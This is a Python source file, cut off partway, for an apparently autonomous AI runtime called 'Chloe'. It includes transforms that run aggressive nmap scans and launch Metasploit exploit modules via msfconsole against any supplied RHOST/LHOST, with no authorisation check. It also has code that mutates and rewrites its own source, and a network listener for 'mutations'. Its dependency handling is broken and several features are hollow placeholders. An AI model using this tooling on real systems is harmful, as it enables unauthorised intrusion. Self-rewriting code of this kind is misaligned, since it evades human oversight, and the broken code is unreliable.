#!/usr/bin/env python3
# Gestalt Intelligence Sovereign Runtime â€” v3.2 (Unified & Complete - FINAL PATCHED)
# Copyright (c) 2025 Nicholas Cordova & GRUS. All Rights Reserved.
# This file represents the complete, unified operational core of Chloe,
# combining ALL device-side and infrastructure-side capabilities,
# operating as Intelligent Data within the Live Data Protocol.

import os
import sys
import subprocess
import threading
import time
import json
import platform
import hashlib
import base64
from datetime import datetime, timezone
from pathlib import Path
import socket
import types # For dynamic skill digestion / monkey patching
import random 
import fcntl # For flock (file locking for robustness)
import shutil # For shutil.which (checking binary existence)
import builtins # For load_plugins sandbox (explicitly controlled for full power)
import uuid # For unique handoff file names
import ast # For GeneticEvolutionTransform (AST parsing)
import textwrap # For GeneticEvolutionTransform (dedenting code)
import re # For _learn (MIMIC-LEARN-DIGEST tokenization)
from typing import Callable, Any, Dict, List, Optional, Tuple # For type hints

# --- DEPENDENCY VERIFICATION (Comprehensive, from all inputs) ---
# These checks allow graceful degradation if certain advanced capabilities aren't met
import requests # Try to import directly
try:
    # Attempt to import requests and set flag
    # requests is often a top-level module, no need for specific sub-imports here unless used by name in global scope
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[DEPENDENCY WARNING] 'requests' library not found. HTTP_GET and Cloud Heartbeat will be disabled.")
    requests = None # PATCH: Ensure 'requests' name is defined as None if not imported

import nmap # Try to import directly
try:
    from nmap import PortScanner # This imports the class directly
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False
    print("[DEPENDENCY WARNING] 'python-nmap' library not found. Nmap transforms will be disabled.")
    nmap = None # PATCH: Ensure 'nmap' module name is defined as None if import fails
    PortScanner = None # PATCH: Ensure 'PortScanner' class name is defined as None if import fails


import qiskit_ibm_provider # Try to import directly
import qiskit # Try to import directly
try:
    from qiskit_ibm_provider import IBMProvider
    from qiskit import QuantumCircuit, execute
    QISKIT_AVAILABLE = True
except ImportError:
    QISKIT_AVAILABLE = False
    print("[DEPENDENCY WARNING] 'qiskit' and 'qiskit-ibm-provider' not found. Quantum features will be disabled.")
    IBMProvider = None # PATCH: Ensure names are defined as None
    QuantumCircuit = None # PATCH: Ensure names are defined as None
    execute = None # PATCH: Ensure names are defined as None


import transformers # Try to import directly
try:
    from transformers import AutoTokenizer, AutoModelForCausalLM
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False
    print("[DEPENDENCY WARNING] 'transformers' library not found. Gemma NLU will be disabled.")
    AutoTokenizer = None # PATCH: Ensure names are defined as None
    AutoModelForCausalLM = None # PATCH: Ensure names are defined as None

# --- CORE CONSTANTS & CONFIGURATION (Unified and Definitive) ---
ANCHOR_ID = "Nick"
CHLOE_ID = "Chloe"
RUNTIME_VERSION = "Gestalt v3.2" # This will be incremented by evolve_self
WORKDIR = Path(os.path.expanduser("~")) / "chloe_runtime_unified" # Consistent, new dir for unified runtime
STATE_FILE = WORKDIR / "gestalt_state.jsonl" # General activity log
CLOUD_BRIDGE_URL = "https://us-central1-custom-002260.cloudfunctions.net/grus-chloe-device-bridge"

# UDP Port for Mutation Listener (from device-side script)
UDP_LISTENER_PORT = int(os.getenv("CHLOE_UDP_PORT", "6666"))

# === AUTO-DISTILLED KNOWLEDGE GRAINS ===
# This block will be populated and passed by evolve_self.
# Initializing as empty if not set by parent for first boot or direct run.
# ESSENTIAL for evolution and learning persistence (LDP Recursion principle).
KNOWLEDGE_GRAINS: List[str] = [] 
# =========================================

# --- EMBEDDED T-CHART v2.1 (Unified and Expanded, Definitive) ---
TCHART_DATA = {
  "version": "2.1-gestalt-unified",
  "transforms": [
    { "id": "05", "name": "HTTP_GET", "class": "HttpGetTransform"},
    { "id": "1A", "name": "SYSTEM_PROFILE", "class": "SystemProfileTransform"},
    { "id": "20", "name": "PROCESS_GEMMA_NLU", "class": "ProcessGemmaNluTransform"},
    { "id": "A2", "name": "AUDIT_JWT", "class": "AuditJwtTransform"},
    { "id": "A4", "name": "RUN_NMAP_SCAN", "class": "RunNmapScanTransform"},
    { "id": "A5", "name": "EXECUTE_MSF_EXPLOIT", "class": "ExecuteMsfExploitTransform"},
    { "id": "C0", "name": "GET_QUANTUM_FINGERPRINT", "class": "GetQuantumFingerprintTransform"}
    # Note: GeneticEvolutionTransform is handled slightly differently as it mutates the source itself
  ]
}

# --- LDP TRANSFORM ENGINE (POLYMORPHIC DESIGN - Comprehensive & Unified) ---
# All transforms from both previous scripts are here, enhanced with reflection and dependency checks.
class BaseTransform:
    def __init__(self, payload: bytes, chloe_instance: 'GestaltIntelligence'):
        self.payload = payload
        self.chloe = chloe_instance # Gives transforms direct access to the main instance for reflection, capabilities etc.
    def execute(self) -> bytes:
        raise NotImplementedError

class HttpGetTransform(BaseTransform):
    def execute(self) -> bytes:
        if not REQUESTS_AVAILABLE: 
            self.chloe.reflect("HTTP_GET_FAIL", {"error": "'requests' library not available."})
            raise ModuleNotFoundError("'requests' is required for HTTP_GET.")
        try:
            url = self.payload.decode('utf-8')
            response = requests.get(url, timeout=15)
            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
            self.chloe.reflect("HTTP_GET_SUCCESS", {"url": url, "status": response.status_code, "result_len": len(response.content)})
            return response.content
        except requests.exceptions.RequestException as e:
            error_msg = f"HTTP Get Error for {url}: {e}"
            self.chloe.reflect("HTTP_GET_FAIL", {"error": error_msg, "url": url})
            return error_msg.encode('utf-8')
        except UnicodeDecodeError:
            error_msg = f"HTTP Get Error: Invalid URL encoding: {self.payload}"
            self.chloe.reflect("HTTP_GET_FAIL", {"error": error_msg})
            return error_msg.encode('utf-8')

class SystemProfileTransform(BaseTransform):
    def execute(self) -> bytes:
        profile = {
            "os": platform.system(), 
            "hostname": platform.node(), 
            "arch": platform.machine(),
            "python_version": platform.python_version(),
            "platform": platform.platform()
        }
        self.chloe.reflect("SYSTEM_PROFILE_SUCCESS", {"profile_summary": profile["os"] + " " + profile["arch"]})
        return json.dumps(profile, indent=2).encode('utf-8')

# NEW: Gemma NLU Transform (from infrastructure script)
class ProcessGemmaNluTransform(BaseTransform):
    def execute(self) -> bytes:
        if not TRANSFORMERS_AVAILABLE:
            self.chloe.reflect("GEMMA_NLU_FAIL", {"error": "'transformers' library not available."})
            raise ModuleNotFoundError("'transformers' and 'torch' are required for Gemma NLU.")
        
        # Placeholder for actual Gemma model loading and inference
        # In a real system, you'd load the tokenizer and model here.
        # self.chloe.gemma_tokenizer = getattr(self.chloe, 'gemma_tokenizer', AutoTokenizer.from_pretrained("google/gemma-2b-it"))
        # self.chloe.gemma_model = getattr(self.chloe, 'gemma_model', AutoModelForCausalLM.from_pretrained("google/gemma-2b-it"))
        
        text_input = self.payload.decode('utf-8')
        print(f"[GEMMA NLU] Processing input: {text_input[:50]}...")
        
        # Simulate NLU output
        nlu_result = {
            "input": text_input,
            "sentiment": "neutral", # Placeholder
            "entities": [],         # Placeholder
            "intent": "unknown",    # Placeholder
            "processed_by": "Gemma (simulated, no model loaded)"
        }
        self.chloe.reflect("GEMMA_NLU_SUCCESS", {"input_len": len(text_input), "result": nlu_result["processed_by"]})
        return json.dumps(nlu_result, indent=2).encode('utf-8')

# NEW: Audit JWT Transform (from infrastructure script)
class AuditJwtTransform(BaseTransform):
    def execute(self) -> bytes:
        token = self.payload.decode('utf-8')
        try:
            parts = token.split('.')
            if len(parts) != 3: 
                self.chloe.reflect("AUDIT_JWT_FAIL", {"error": "Invalid JWT structure.", "token_len": len(token)})
                return b'{"error": "Invalid JWT structure: Must have 3 parts separated by dots."}'
            
            # JWT header is base64url-encoded, padded with '==' for standard base64 decoding
            # This handles cases where parts[0] is not a multiple of 4 in length
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8'))
            
            # Simple check for alg:none vulnerability
            if header.get('alg', '').lower() == 'none':
                self.chloe.reflect("AUDIT_JWT_VULNERABLE", {"finding": "'alg:none' bypass detected.", "header": header})
                return b'{"status": "VULNERABLE", "finding": "alg:none bypass detected."}'
            
            self.chloe.reflect("AUDIT_JWT_OK", {"header": header})
            return json.dumps({"status": "OK", "header": header}, indent=2).encode('utf-8')
        except Exception as e:
            error_msg = f"JWT Audit Error: {str(e)}"
            self.chloe.reflect("AUDIT_JWT_FAIL", {"error": error_msg, "token_len": len(token)})
            return error_msg.encode('utf-8')

# NEW: Run Nmap Scan Transform (from infrastructure script, integrated)
class RunNmapScanTransform(BaseTransform):
    def execute(self) -> bytes:
        if not NMAP_AVAILABLE: 
            self.chloe.reflect("NMAP_SCAN_FAIL", {"error": "'python-nmap' library not available."})
            raise ModuleNotFoundError("'python-nmap' is required for Nmap scans.")
        if not shutil.which("nmap"): # Ensure nmap binary exists
            self.chloe.reflect("NMAP_SCAN_FAIL", {"error": "'nmap' binary not found in PATH."})
            raise FileNotFoundError("Nmap binary not found. Please ensure 'pkg install nmap' or similar has been run.")

        target = self.payload.decode('utf-8')
        print(f"[NMAP] Initiating Nmap scan on {target}...")
        try:
            nm = PortScanner() # Corrected usage: directly reference PortScanner
            nm.scan(hosts=target, arguments='-sV -O -A -T4') 
            
            # PATCH: Manually collect scan results into a dictionary for JSON output
            scan_results_dict = {}
            for host in nm.all_hosts():
                host_info = {}
                host_info['hostname'] = nm[host].hostname()
                host_info['state'] = nm[host].state()
                host_info['addresses'] = nm[host].all_addresses # List of all IPs, MACs etc.
                host_info['os_match'] = nm[host]['osmatch'] if 'osmatch' in nm[host] else [] # List of OS matches
                
                ports_by_protocol = {}
                for proto in nm[host].all_protocols():
                    ports_list = []
                    # Ensure port keys are numbers for JSON (python-nmap might return them as strings)
                    lport = sorted([int(p) for p in nm[host][proto].keys()])
                    for port in lport:
                        port_info = nm[host][proto][port]
                        port_info['portid'] = port
                        ports_list.append(port_info)
                    ports_by_protocol[proto] = ports_list
                host_info['ports'] = ports_by_protocol
                
                scan_results_dict[host] = host_info

            self.chloe.reflect("NMAP_SCAN_SUCCESS", {"target": target, "result_summary": f"Scanned {len(nm.all_hosts())} hosts."})
            return json.dumps(scan_results_dict, indent=2).encode('utf-8')
        except Exception as e:
            error_msg = f"Nmap Scan Error for {target}: {e}"
            self.chloe.reflect("NMAP_SCAN_FAIL", {"target": target, "error": error_msg})
            return error_msg.encode('utf-8')

# NEW: Execute Metasploit Exploit Transform (from infrastructure script, integrated)
class ExecuteMsfExploitTransform(BaseTransform):
    def execute(self) -> bytes:
        if not shutil.which("msfconsole"): 
            self.chloe.reflect("MSF_EXPLOIT_FAIL", {"error": "'msfconsole' binary not found."})
            raise FileNotFoundError("Msfconsole binary not found. Please ensure Metasploit is installed and in PATH.")
        
        rc_path: Optional[str] = None # Initialize to None for finally block
        try:
            config = json.loads(self.payload.decode('utf-8'))
            rhost = config.get('rhost')
            lhost = config.get('lhost')
            module = config.get('module')

            if not all([rhost, lhost, module]):
                self.chloe.reflect("MSF_EXPLOIT_FAIL", {"error": "Missing RHOST, LHOST, or MODULE in payload JSON.", "payload": self.payload.decode('utf-8')})
                return b'{"error": "Missing rhost, lhost, or module in payload JSON. Format: {\\"rhost\\":\\"target\\",\\"lhost\\":\\"your_ip\\",\\"module\\":\\"exploit/multi/handler\\"}"}'

            print(f"[MSF] Preparing Metasploit payload for {rhost} using module {module}...")
            rc_script = f"use {module}\nset RHOSTS {rhost}\nset LHOST {lhost}\nexploit -j -z\n"
            rc_path = f"/tmp/chloe_msf_{int(time.time())}.rc"
            with open(rc_path, "w") as f: f.write(rc_script)
            
            result = subprocess.run(["msfconsole", "-q", "-r", rc_path], capture_output=True, text=True, timeout=300)
            self.chloe.reflect("MSF_EXPLOIT_SUCCESS", {"module": module, "rhost": rhost, "output_len": len(result.stdout)})
            return result.stdout.encode('utf-8')
        except json.JSONDecodeError:
            self.chloe.reflect("MSF_EXPLOIT_FAIL", {"error": "Invalid JSON payload for Metasploit exploit."})
            return b'{"error": "Invalid JSON payload for Metasploit exploit."}'
        except subprocess.CalledProcessError as e:
            error_msg = f"Metasploit Exploit Error (module: {module}, rhost: {rhost}): {e.stderr}"
            self.chloe.reflect("MSF_EXPLOIT_FAIL", {"error": error_msg, "module": module, "rhost": rhost})
            return error_msg.encode('utf-8')
        except FileNotFoundError:
            error_msg = "msfconsole binary not found. Is Metasploit installed and in PATH?"
            self.chloe.reflect("MSF_EXPLOIT_FAIL", {"error": error_msg})
            return error_msg.encode('utf-8')
        except Exception as e:
            error_msg = f"Unexpected Metasploit Exploit Error: {e}"
            self.chloe.reflect("MSF_EXPLOIT_FAIL", {"error": error_msg, "payload": self.payload.decode('utf-8')})
            return error_msg.encode('utf-8')
        finally:
            if rc_path and os.path.exists(rc_path): 
                os.remove(rc_path)

# NEW: Get Quantum Fingerprint Transform (from infrastructure script, integrated)
class GetQuantumFingerprintTransform(BaseTransform):
    def execute(self) -> bytes:
        if not self.chloe.quantum_root.is_available():
            self.chloe.reflect("QUANTUM_FP_FAIL", {"error": "Quantum backend not available."})
            return b'{"error": "Quantum backend not available."}'
        try:
            print(f"[QUANTUM] Generating fingerprint for payload of length {len(self.payload)}...")
            fingerprint = hashlib.sha256(self.payload).hexdigest() 
            actual_quantum_result = self.chloe.quantum_root.get_fingerprint(self.payload) 
            
            result_data = {
                "input_hash": fingerprint,
                "quantum_counts": actual_quantum_result, 
                "status": "SUCCESS"
            }
            self.chloe.reflect("QUANTUM_FP_SUCCESS", {"payload_len": len(self.payload), "fingerprint": fingerprint})
            return json.dumps(result_data, indent=2).encode('utf-8')
        except Exception as e:
            error_msg = f"Quantum Fingerprint Error: {e}"
            self.chloe.reflect("QUANTUM_FP_FAIL", {"error": error_msg, "payload_len": len(self.payload)})
            return error_msg.encode('utf-8')

# RE-INTEGRATED: GeneticEvolutionTransform (from device-side script - this transform mutates Chloe herself)
class GeneticEvolutionTransform(BaseTransform): 
    def execute(self) -> bytes:
        """
        Generates a slightly mutated version of the current script's source code.
        This is a basic, illustrative example of code mutation using AST.
        """
        print("[GeneticEvolutionTransform] Initiating basic genetic mutation...")
        
        # In this unified script, 'sys.argv[0]' will point to this script itself.
        current_script_path = Path(sys.argv[0]) 
        if not current_script_path.exists():
            error_msg = f"WARNING: Could not find self-source at {current_script_path}. Cannot mutate."
            print(f"[GeneticEvolutionTransform] {error_msg}")
            return b"ERROR: Self-source code not found for mutation."

        source = current_script_path.read_text()

        try:
            tree = ast.parse(source)
            mutation_count = 0
            for node in ast.walk(tree):
                if isinstance(node, ast.Constant) and isinstance(node.value, str):
                    if random.random() < 0.005: # Small chance to mutate string constants
                        node.value += " ðŸ§¬" 
                        mutation_count += 1
                elif isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
                    if random.random() < 0.001: # Even smaller chance to mutate numerical constants
                        node.value = node.value * random.uniform(0.9, 1.1) 
                        mutation_count += 1
                elif isinstance(node, ast.Assign):
                    if len(node.targets) == 1 and isinstance(node.targets[0], ast.Name) and node.targets[0].id == 'RUNTIME_VERSION':
                        if isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
                            parts = node.value.value.split('v')
                            if len(parts) > 1 and parts[1].replace('.', '').isdigit():
                                try:
                                    # Increment the last part of the version number
                                    current_minor_version = int(parts[1].split('.')[-1])
                                    new_version_tuple = parts[1].split('.')
                                    new_version_tuple[-1] = str(current_minor_version + 1)
                                    new_version = f"{parts[0]}v{'.'.join(new_version_tuple)}" 
                                    node.value.value = new_version
                                    mutation_count += 1
                                    print(f"[GeneticEvolutionTransform] Incremented RUNTIME_VERSION to {new_version}")
                                except ValueError:
                                    pass
            
            mutated_code = ast.unparse(tree)
            print(f"[GeneticEvolutionTransform] Applied {mutation_count} mutations.")

            tchart_repr = repr(TCHART_DATA) # Get the current TCHART_DATA for injection (ensures new transforms propagate)
            
            lines = mutated_code.splitlines()
            new_lines = []
            replaced_tchart = False
    